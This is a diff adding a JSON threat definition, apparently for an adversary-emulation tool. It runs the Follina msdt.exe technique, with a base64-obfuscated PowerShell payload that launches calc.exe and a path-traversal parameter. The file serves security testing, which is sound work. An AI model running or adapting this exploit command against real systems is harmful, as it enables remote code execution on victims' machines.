@@ -1,0 +1,35 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "Executes calc.exe indirectly via msdt.exe. Note that threat will hang until the support window is closed on the target system. Even then it will return failure since msdt technically fails to execute appropriately.",
+        "display_name": "Follina msdt calc",
+        "name": "Follina msdt calc",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "{\"--cp\":\"127.0.0.1:443\",\"--multipart\":10240,\"--secure\":true}",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "2": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(iex($(iex('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'aWV4KCJjbWQuZXhlIC9jIGNhbGMuZXhlIik='+[char]34+'))'))))i../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\"",
+                "rtags": [
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1202",
+                    "att&ck-technique:T1059.001"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29",
+        "tags": []
+    }
+}
